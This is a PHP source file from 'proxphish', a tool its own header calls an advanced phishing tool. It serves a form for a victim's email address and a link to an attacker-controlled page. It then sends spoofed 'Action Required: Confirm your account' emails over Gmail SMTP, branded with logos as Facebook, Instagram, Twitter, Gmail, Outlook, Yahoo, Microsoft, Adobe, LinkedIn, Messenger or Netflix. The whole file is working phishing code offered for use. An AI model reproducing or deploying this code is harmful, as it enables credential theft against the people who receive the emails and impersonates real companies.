<?php

/*
*  Copyright (c) 2020 Barchampas Gerasimos <makindosxx@gmail.com>.
*  proxphish is a advanced phishing tool.
*
*  proxphish is free software: you can redistribute it and/or modify
*  it under the terms of the GNU Affero General Public License as published by
*  the Free Software Foundation, either version 3 of the License, or
*  (at your option) any later version.
*
*  proxphish is distributed in the hope that it will be useful,
*  but WITHOUT ANY WARRANTY; without even the implied warranty of
*  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
*  GNU Affero General Public License for more details.
*
*  You should have received a copy of the GNU Affero General Public License
*  along with this program.  If not, see <http://www.gnu.org/licenses/>.
*
*/


ini_set('display_errors', '1');
ini_set('display_startup_errors', '1');
error_reporting(E_ALL);





 session_start();

 clearstatcache();

?>


<html>
<head>

    <title> ProxPhish </title>
  
  <link rel="icon" type="image/jpg" href="/css/icons/logo.png" />

 <link rel="stylesheet" type="text/css" href="css/dns.css">



<style>
input[type='radio'] 
{ 
transform: scale(2); 
}
</style>


</head>




<body id="body">


    <div class="shell-wrap">
  <p class="shell-top-bar"> ProxPhish </p>
  
 
     <div align="center">
     
                 <?php 
                  //$ngrok = shell_exec('/var/www/proxphish/ngrok./ngrok http 80'); 
                  //echo $ngrok;
                  ?>

            <br><br><br>


         <form action="" method="post">


  <font color="white">  < </font>
     <input type="email" name="email" id="email" maxlength="64" placeholder="Email to victim"  required> 
      <font color="white"> > </font>
 
      <font color="white">  < </font>
     <input type="text" name="ngrok" id="ngrok" maxlength="64" placeholder="Ngrok link or Another"  required> 
      <font color="white"> > </font>

             <br><br> 

    <input type="submit" name="submit_email_phishing" value="Email Phishing" id="submit">
         </form>
      </div>
    

         <br>

 
  <div id="footer" align="center">
   <img src="css/icons/logo.png" height="300" width="300">
   </div>
   


 


</body>
</html>




<?php


  require_once('__SRC__/class_tools.php');

  if (class_exists('INPUT_DATA_AVAILABLE')) 
      {
        $obj_dns = new INPUT_DATA_AVAILABLE;

     // for sumbit email phishing
     if (isset($_POST['submit_email_phishing']))
         {
 
        $email     =  $obj_dns-> SAFE_DATA_ENTER($_POST['email']);
        $ngrok     =  $obj_dns-> SAFE_DATA_ENTER($_POST['ngrok']);

               // Get clone site name from send link to email 
        

             if (isset($_SESSION['site_hack']))             
                {
                  $str_link =  $_SESSION['site_hack'];
                  $str_link2 = str_replace("https://www.","",$str_link);
                  $str_link3 = str_replace(".com","",$str_link2);
                  $str_link4 = ucfirst($str_link3);
                  $link =   "no-reply" ."@" .$str_link3 .".com";
                  }


            if (isset($_SESSION['site_ready']))           
                {
                  $str_link  = $_SESSION['site_ready'];
                  $str_link2 = str_replace("https://www.","",$str_link);
                  $str_link3 = str_replace(".com","",$str_link2);
                  $str_link4 = ucfirst($str_link3);
                  $link =   "no-reply" ."@" .$str_link3 .".com";
                   }

   
   //Get email server informations for connect to mail server
  // Get email account details for login mail and send
  // Using one gmail for this attack method


    $handle = @fopen('settings.php', "r");

    if ($handle) 
       { 
        while (!feof($handle)) { 
        $line[] = fgets($handle, 4096); 
         } 
       fclose($handle); 
        } 

      $mail_user   = $line[1];
      $mail_pass   = $line[2];


//echo $mail_user ."<br>" .$mail_pass;
//exit;




 if ($link == 'no-reply@facebook.com')
        {
          //$link = str_replace(".com_pc","",$str_link2);
          //$link =   "no-reply" ."@" .$link .".com";
      require "/var/www/proxior/mail/PHPMailerAutoload.php";
$mail = new PHPMailer(); // create a new object

$mail->CharSet = 'UTF-8';

$mail->isSMTP();                                      // Set mailer to use SMTP
$mail->Host = 'smtp.gmail.com';  // Specify main and backup SMTP servers
$mail->SMTPAuth = true;                               // Enable SMTP authentication
$mail->Username = "$mail_user";                 // SMTP username
$mail->Password = "$mail_pass";                           // SMTP password
$mail->SMTPSecure = 'tls';                            // Enable TLS encryption, `ssl` also accepted
$mail->Port = 587;     


$mail->SetFrom('Facebook', 'Facebook'); // 

$mail->FromName = 'Facebook'; // 

$mail->AddEmbeddedImage('css/mail_pics/fb.png', 'fb');

$mail->IsHTML(true);

$mail->Subject = "Confirm your Facebook account";
$mail->Body = "<h2> <img src='cid:fb' height='24' width='24'> 
                <font color='#45569C'>
                 Action Required: Confirm your Facebook account  
                 </font>  
              </h2> 
               <br><br>
               <a href='$ngrok' style='display: block; width: 17em; height: 1.2em; padding: 16px;
                                                  text-align: center; border-radius: 3px; color: white;
                                                  font-weight: bold; background:#45569C; color:white; 
                                                  font-size: 14px; text-decoration: none'> 
                Confirm your account 
                </a>";
             
$mail->AddAddress("$email");
     if ($mail->Send()) 
        {
      // echo '<script type="text/javascript">alert("Phishing attack Successfully");
        // </script>';
        echo ("<script>location.href='/'</script>");
         }
     else 
      {
      echo '<script type="text/javascript">alert("Phishing attack failed");
         </script>';
      echo ("<script>location.href='/'</script>");
       }
      } // end if site ready facebook pc
 


 else if ($link == 'no-reply@instagram.com')
        {
     require "/var/www/proxior/mail/PHPMailerAutoload.php";
$mail = new PHPMailer(); // create a new object

$mail->CharSet = 'UTF-8';

$mail->isSMTP();                                      // Set mailer to use SMTP
$mail->Host = 'smtp.gmail.com';  // Specify main and backup SMTP servers
$mail->SMTPAuth = true;                               // Enable SMTP authentication
$mail->Username = "$mail_user";                 // SMTP username
$mail->Password = "$mail_pass";                           // SMTP password
$mail->SMTPSecure = 'tls';                            // Enable TLS encryption, `ssl` also accepted
$mail->Port = 587;   

$mail->SetFrom('Instagram', 'Instagram'); // 

$mail->FromName = 'Instagram'; // 

$mail->AddEmbeddedImage('css/mail_pics/inst.png', 'inst');

$mail->IsHTML(true);

$mail->Subject = "Confirm your Instagram account";
$mail->Body = "<h2> <img src='cid:inst' height='24' width='24'> 
                <font color='#EB9E6B'>
                 Action Required: Confirm your Instagram account  
                 </font>  
              </h2> 
               <br><br>
               <a href='$ngrok' style='display: block; width: 17em; height: 1.2em; padding: 16px;
                                                  text-align: center; border-radius: 3px; color: white;
                                                  font-weight: bold; background:#EB9E6B; color:white; 
                                                  font-size: 14px; text-decoration: none'> 
                Confirm your account 
                </a>";
             
$mail->AddAddress("$email");
     if ($mail->Send()) 
        {
      // echo '<script type="text/javascript">alert("Phishing attack Successfully");
        // </script>';
        echo ("<script>location.href='/'</script>");
          // echo $mail->ErrorInfo; exit;
         }
     else 
      {
      echo '<script type="text/javascript">alert("Phishing attack failed");
         </script>';
       echo ("<script>location.href='/'</script>");
          // echo $mail->ErrorInfo; exit;
       }
      } // end if site ready instagram



else if ($link == 'no-reply@twitter.com')
        {
      require "/var/www/proxior/mail/PHPMailerAutoload.php";
$mail = new PHPMailer(); // create a new object

$mail->CharSet = 'UTF-8';

$mail->isSMTP();                                      // Set mailer to use SMTP
$mail->Host = 'smtp.gmail.com';  // Specify main and backup SMTP servers
$mail->SMTPAuth = true;                               // Enable SMTP authentication
$mail->Username = "$mail_user";                 // SMTP username
$mail->Password = "$mail_pass";                           // SMTP password
$mail->SMTPSecure = 'tls';                            // Enable TLS encryption, `ssl` also accepted
$mail->Port = 587;   

$mail->SetFrom('Twitter', 'Twitter'); // 

$mail->FromName = 'Twitter'; // 

$mail->AddEmbeddedImage('css/mail_pics/twitt.png', 'twitt');

$mail->IsHTML(true);

$mail->Subject = "Confirm your Twitter account";
$mail->Body = "<h2> <img src='cid:twitt' height='24' width='24'> 
                <font color='#65A8EC'>
                 Action Required: Confirm your Twitter account  
                 </font>  
              </h2> 
               <br><br>
               <a href='$ngrok' style='display: block; width: 17em; height: 1.2em; padding: 16px;
                                                  text-align: center; border-radius: 3px; color: white;
                                                  font-weight: bold; background:#65A8EC; color:white; 
                                                  font-size: 14px; text-decoration: none'> 
                Confirm your account 
                </a>";
             
$mail->AddAddress("$email");
     if ($mail->Send()) 
        {
      // echo '<script type="text/javascript">alert("Phishing attack Successfully");
        // </script>';
        echo ("<script>location.href='/'</script>");
         }
     else 
      {
      echo '<script type="text/javascript">alert("Phishing attack failed");
         </script>';
       echo ("<script>location.href='/'</script>");
       }
      } // end if site ready twitter





else if ($link == 'no-reply@gmail.com')
        {
      require "/var/www/proxior/mail/PHPMailerAutoload.php";
$mail = new PHPMailer(); // create a new object

$mail->CharSet = 'UTF-8';

$mail->isSMTP();                                      // Set mailer to use SMTP
$mail->Host = 'smtp.gmail.com';  // Specify main and backup SMTP servers
$mail->SMTPAuth = true;                               // Enable SMTP authentication
$mail->Username = "$mail_user";                 // SMTP username
$mail->Password = "$mail_pass";                           // SMTP password
$mail->SMTPSecure = 'tls';                            // Enable TLS encryption, `ssl` also accepted
$mail->Port = 587;   

$mail->SetFrom('Gmail', 'Gmail'); // 

$mail->FromName = 'Gmail'; // 

$mail->AddEmbeddedImage('css/mail_pics/gm.png', 'gm');

$mail->IsHTML(true);

$mail->Subject = "Confirm your Gmail account";
$mail->Body = "<h2> <img src='cid:gm' height='24' width='24'> 
                <font color='#CA3737'>
                 Action Required: Confirm your Gmail account  
                 </font>  
              </h2> 
               <br><br>
               <a href='$ngrok' style='display: block; width: 17em; height: 1.2em; padding: 16px;
                                                  text-align: center; border-radius: 3px; color: white;
                                                  font-weight: bold; background:#CA3737; color:white; 
                                                  font-size: 14px; text-decoration: none'> 
                Confirm your account 
                </a>";
             
$mail->AddAddress("$email");
     if ($mail->Send()) 
        {
      // echo '<script type="text/javascript">alert("Phishing attack Successfully");
        // </script>';
        echo ("<script>location.href='/'</script>");
         }
     else 
      {
      echo '<script type="text/javascript">alert("Phishing attack failed");
         </script>';
       echo ("<script>location.href='/'</script>");
       }
      } // end if site ready gmail



else if ($link == 'no-reply@https://login.live.com')
        {
          $str_link2 = str_replace("https://","",$str_link);
          $str_link3 = str_replace(".com","",$str_link2);
          $link =   "no-reply" ."@" .$str_link3 .".com";
      require "/var/www/proxior/mail/PHPMailerAutoload.php";
$mail = new PHPMailer(); // create a new object

$mail->CharSet = 'UTF-8';

$mail->isSMTP();                                      // Set mailer to use SMTP
$mail->Host = 'smtp.gmail.com';  // Specify main and backup SMTP servers
$mail->SMTPAuth = true;                               // Enable SMTP authentication
$mail->Username = "$mail_user";                 // SMTP username
$mail->Password = "$mail_pass";                           // SMTP password
$mail->SMTPSecure = 'tls';                            // Enable TLS encryption, `ssl` also accepted
$mail->Port = 587;   

$mail->SetFrom('Outlook', 'Outlook'); // 

$mail->FromName = 'Outlook'; // 

$mail->AddEmbeddedImage('css/mail_pics/outl.png', 'outl');

$mail->IsHTML(true);

$mail->Subject = "Confirm your Outlook account";
$mail->Body = "<h2> <img src='cid:outl' height='24' width='24'> 
                <font color='#006BC1'>
                 Action Required: Confirm your Outlook account  
                 </font>  
              </h2> 
               <br><br>
               <a href='$ngrok' style='display: block; width: 17em; height: 1.2em; padding: 16px;
                                                  text-align: center; border-radius: 3px; color: white;
                                                  font-weight: bold; background:#006BC1; color:white; 
                                                  font-size: 14px; text-decoration: none'> 
                Confirm your account 
                </a>";
             
$mail->AddAddress("$email");
     if ($mail->Send()) 
        {
      // echo '<script type="text/javascript">alert("Phishing attack Successfully");
        // </script>';
        echo ("<script>location.href='/'</script>");
         }
     else 
      {
      echo '<script type="text/javascript">alert("Phishing attack failed");
         </script>';
       echo ("<script>location.href='/'</script>");
       }
      } // end if site ready outlook



else if ($link == 'no-reply@yahoo.com')
        {
      require "/var/www/proxior/mail/PHPMailerAutoload.php";
$mail = new PHPMailer(); // create a new object

$mail->CharSet = 'UTF-8';

$mail->isSMTP();                                      // Set mailer to use SMTP
$mail->Host = 'smtp.gmail.com';  // Specify main and backup SMTP servers
$mail->SMTPAuth = true;                               // Enable SMTP authentication
$mail->Username = "$mail_user";                 // SMTP username
$mail->Password = "$mail_pass";                           // SMTP password
$mail->SMTPSecure = 'tls';                            // Enable TLS encryption, `ssl` also accepted
$mail->Port = 587;   

$mail->SetFrom('Yahoo', 'Yahoo'); // 

$mail->FromName = 'Yahoo'; // 

$mail->AddEmbeddedImage('css/mail_pics/yah.png', 'yah');

$mail->IsHTML(true);

$mail->Subject = "Confirm your Yahoo account";
$mail->Body = "<h2> <img src='cid:yah' height='24' width='24'> 
                <font color='#720E9E'>
                 Action Required: Confirm your Yahoo account 
                 </font>  
              </h2> 
               <br><br>
               <a href='$ngrok' style='display: block; width: 17em; height: 1.2em; padding: 16px;
                                                  text-align: center; border-radius: 3px; color: white;
                                                  font-weight: bold; background:#720E9E; color:white; 
                                                  font-size: 14px; text-decoration: none'> 
                Confirm your account 
                </a>";
             
$mail->AddAddress("$email");
     if ($mail->Send()) 
        {
      // echo '<script type="text/javascript">alert("Phishing attack Successfully");
        // </script>';
        echo ("<script>location.href='/'</script>");
         }
     else 
      {
      echo '<script type="text/javascript">alert("Phishing attack failed");
         </script>';
       echo ("<script>location.href='/'</script>");
       }
      } // end if site ready yahoo





else if ($link == 'no-reply@microsoft.com')
        {
      require "/var/www/proxior/mail/PHPMailerAutoload.php";
$mail = new PHPMailer(); // create a new object

$mail->CharSet = 'UTF-8';

$mail->isSMTP();                                      // Set mailer to use SMTP
$mail->Host = 'smtp.gmail.com';  // Specify main and backup SMTP servers
$mail->SMTPAuth = true;                               // Enable SMTP authentication
$mail->Username = "$mail_user";                 // SMTP username
$mail->Password = "$mail_pass";                           // SMTP password
$mail->SMTPSecure = 'tls';                            // Enable TLS encryption, `ssl` also accepted
$mail->Port = 587;   

$mail->SetFrom('no-reply@microsoft', 'no-reply@microsoft'); // 

$mail->FromName = 'no-reply@microsoft'; // 

$mail->AddEmbeddedImage('css/mail_pics/micro.png', 'micro');

$mail->IsHTML(true);

$mail->Subject = "Confirm your Microsoft account";
$mail->Body = "<h2> <img src='cid:micro' height='24' width='24'> 
                <font color='#FCB700'>
                 Action Required: Confirm your Microsoft account 
                 </font>  
              </h2> 
               <br><br>
               <a href='$ngrok' style='display: block; width: 17em; height: 1.2em; padding: 16px;
                                                  text-align: center; border-radius: 3px; color: white;
                                                  font-weight: bold; background:#FCB700; color:white; 
                                                  font-size: 14px; text-decoration: none'> 
                Confirm your account 
                </a>";
             
$mail->AddAddress("$email");
     if ($mail->Send()) 
        {
      // echo '<script type="text/javascript">alert("Phishing attack Successfully");
        // </script>';
        echo ("<script>location.href='/'</script>");
         }
     else 
      {
      echo '<script type="text/javascript">alert("Phishing attack failed");
         </script>';
       echo ("<script>location.href='/'</script>");
       }
      } // end if site ready microsoft





else if ($link == 'no-reply@adobe.com')
        {
      require "/var/www/proxior/mail/PHPMailerAutoload.php";
$mail = new PHPMailer(); // create a new object

$mail->CharSet = 'UTF-8';

$mail->isSMTP();                                      // Set mailer to use SMTP
$mail->Host = 'smtp.gmail.com';  // Specify main and backup SMTP servers
$mail->SMTPAuth = true;                               // Enable SMTP authentication
$mail->Username = "$mail_user";                 // SMTP username
$mail->Password = "$mail_pass";                           // SMTP password
$mail->SMTPSecure = 'tls';                            // Enable TLS encryption, `ssl` also accepted
$mail->Port = 587;   

$mail->SetFrom('Adobe Messages', 'Adobe Messages'); // 

$mail->FromName = 'Adobe Messages'; // 

$mail->AddEmbeddedImage('css/mail_pics/adobe.png', 'adobe');

$mail->IsHTML(true);

$mail->Subject = "Confirm your Adobe account";
$mail->Body = "<h2> <img src='cid:adobe' height='24' width='24'> 
                <font color='#FC1001'>
                 Action Required: Confirm your Adobe account 
                 </font>  
              </h2> 
               <br><br>
               <a href='$ngrok' style='display: block; width: 17em; height: 1.2em; padding: 16px;
                                                  text-align: center; border-radius: 3px; color: white;
                                                  font-weight: bold; background:#FC1001; color:white; 
                                                  font-size: 14px; text-decoration: none'> 
                Confirm your account 
                </a>";
             
$mail->AddAddress("$email");
     if ($mail->Send()) 
        {
      // echo '<script type="text/javascript">alert("Phishing attack Successfully");
        // </script>';
        echo ("<script>location.href='/'</script>");
         }
     else 
      {
      echo '<script type="text/javascript">alert("Phishing attack failed");
         </script>';
       echo ("<script>location.href='/'</script>");
       }
      } // end if site ready adobe





else if ($link == 'no-reply@linkedin.com')
        {
      require "/var/www/proxior/mail/PHPMailerAutoload.php";
$mail = new PHPMailer(); // create a new object

$mail->CharSet = 'UTF-8';

$mail->isSMTP();                                      // Set mailer to use SMTP
$mail->Host = 'smtp.gmail.com';  // Specify main and backup SMTP servers
$mail->SMTPAuth = true;                               // Enable SMTP authentication
$mail->Username = "$mail_user";                 // SMTP username
$mail->Password = "$mail_pass";                           // SMTP password
$mail->SMTPSecure = 'tls';                            // Enable TLS encryption, `ssl` also accepted
$mail->Port = 587;   

$mail->SetFrom('Linked In Messages', 'Linked In Messages'); // 

$mail->FromName = 'Linked In Messages'; // 

$mail->AddEmbeddedImage('css/mail_pics/linke.png', 'linke');

$mail->IsHTML(true);

$mail->Subject = "Confirm your Linkedin account";
$mail->Body = "<h2> <img src='cid:linke' height='24' width='24'> 
                <font color='#0071AC'>
                 Action Required: Confirm your Linkedin account 
                 </font>  
              </h2> 
               <br><br>
               <a href='$ngrok' style='display: block; width: 17em; height: 1.2em; padding: 16px;
                                                  text-align: center; border-radius: 3px; color: white;
                                                  font-weight: bold; background:#0071AC; color:white; 
                                                  font-size: 14px; text-decoration: none'> 
                Confirm your account 
                </a>";
             
$mail->AddAddress("$email");
     if ($mail->Send()) 
        {
      // echo '<script type="text/javascript">alert("Phishing attack Successfully");
        // </script>';
        echo ("<script>location.href='/'</script>");
         }
     else 
      {
      echo '<script type="text/javascript">alert("Phishing attack failed");
         </script>';
       echo ("<script>location.href='/'</script>");
       }
      } // end if site ready linkedin





else if ($link == 'no-reply@messenger.com')
        {
      require "/var/www/proxior/mail/PHPMailerAutoload.php";
$mail = new PHPMailer(); // create a new object

$mail->CharSet = 'UTF-8';

$mail->isSMTP();                                      // Set mailer to use SMTP
$mail->Host = 'smtp.gmail.com';  // Specify main and backup SMTP servers
$mail->SMTPAuth = true;                               // Enable SMTP authentication
$mail->Username = "$mail_user";                 // SMTP username
$mail->Password = "$mail_pass";                           // SMTP password
$mail->SMTPSecure = 'tls';                            // Enable TLS encryption, `ssl` also accepted
$mail->Port = 587;   

$mail->SetFrom('Messenger FB', 'Messenger FB'); // 

$mail->FromName = 'Messenger FB'; // 

$mail->AddEmbeddedImage('css/mail_pics/messe.png', 'messe');

$mail->IsHTML(true);

$mail->Subject = "Confirm your Messenger account";
$mail->Body = "<h2> <img src='cid:messe' height='24' width='24'> 
                <font color='#E547A7'>
                 Action Required: Confirm your Messenger account 
                 </font>  
              </h2> 
               <br><br>
               <a href='$ngrok' style='display: block; width: 17em; height: 1.2em; padding: 16px;
                                                  text-align: center; border-radius: 3px; color: white;
                                                  font-weight: bold; background:#E547A7; color:white; 
                                                  font-size: 14px; text-decoration: none'> 
                Confirm your account 
                </a>";
             
$mail->AddAddress("$email");
     if ($mail->Send()) 
        {
      // echo '<script type="text/javascript">alert("Phishing attack Successfully");
        // </script>';
        echo ("<script>location.href='/'</script>");
         }
     else 
      {
      echo '<script type="text/javascript">alert("Phishing attack failed");
         </script>';
       echo ("<script>location.href='/'</script>");
       }
      } // end if site ready messenger





else if ($link == 'no-reply@netflix.com')
        {
      require "/var/www/proxior/mail/PHPMailerAutoload.php";
$mail = new PHPMailer(); // create a new object

$mail->CharSet = 'UTF-8';

$mail->isSMTP();                                      // Set mailer to use SMTP
$mail->Host = 'smtp.gmail.com';  // Specify main and backup SMTP servers
$mail->SMTPAuth = true;                               // Enable SMTP authentication
$mail->Username = "$mail_user";                 // SMTP username
$mail->Password = "$mail_pass";                           // SMTP password
$mail->SMTPSecure = 'tls';                            // Enable TLS encryption, `ssl` also accepted
$mail->Port = 587;   

$mail->SetFrom('Netflix', 'Netflix'); // 

$mail->FromName = 'Netflix'; // 

$mail->AddEmbeddedImage('css/mail_pics/netf.png', 'netf');

$mail->IsHTML(true);

$mail->Subject = "Confirm your Netflix account";
$mail->Body = "<h2> <img src='cid:netf' height='24' width='24'> 
                <font color='#E50914'>
                 Action Required: Confirm your Netflix account 
                 </font>  
              </h2> 
               <br><br>
               <a href='$ngrok' style='display: block; width: 17em; height: 1.2em; padding: 16px;
                                                  text-align: center; border-radius: 3px; color: white;
                                                  font-weight: bold; background:#E50914; color:white; 
                                                  font-size: 14px; text-decoration: none'> 
                Confirm your account 
                </a>";
             
$mail->AddAddress("$email");
     if ($mail->Send()) 
        {
      // echo '<script type="text/javascript">alert("Phishing attack Successfully");
        // </script>';
        echo ("<script>location.href='/'</script>");
         }
     else 
      {
      echo '<script type="text/javascript">alert("Phishing attack failed");
         </script>';
       echo ("<script>location.href='/'</script>");
       }
      } // end if site ready netflix




else 
  {
   require "/var/www/proxior/mail/PHPMailerAutoload.php";
$mail = new PHPMailer(); // create a new object

$mail->CharSet = 'UTF-8';

$mail->isSMTP();                                      // Set mailer to use SMTP
$mail->Host = 'smtp.gmail.com';  // Specify main and backup SMTP servers
$mail->SMTPAuth = true;                               // Enable SMTP authentication
$mail->Username = "$mail_user";                 // SMTP username
$mail->Password = "$mail_pass";                           // SMTP password
$mail->SMTPSecure = 'tls';                            // Enable TLS encryption, `ssl` also accepted
$mail->Port = 587;   

//$mail->SetFrom($link, $link);
$mail->FromName = $link;
$mail->AddEmbeddedImage('css/mail_pics/any.png', 'any');

$mail->IsHTML(true);

$mail->Subject = "Confirm your account";
$mail->Body = "<h2> <img src='cid:any' height='24' width='24'> 
                <font color='black'>
                 Action Required: Confirm your account 
                 </font>  
              </h2> 
               <br><br>
               <a href='$ngrok' style='display: block; width: 17em; height: 1.2em; padding: 16px;
                                                  text-align: center; border-radius: 3px; color: white;
                                                  font-weight: bold; background:grey; color:white; 
                                                  font-size: 14px; text-decoration: none'> 
                Confirm your account 
                </a>";
             
$mail->AddAddress("$email");
     if ($mail->Send()) 
        {
      // echo '<script type="text/javascript">alert("Phishing attack Successfully");
        // </script>';
        echo ("<script>location.href='/'</script>");
         }
     else 
      {
      echo '<script type="text/javascript">alert("Phishing attack failed");
         </script>';
       echo ("<script>location.href='/'</script>");
       }
      } // end if site anything
    } // end isset of email phishing 
   } // end if isset of class


?>
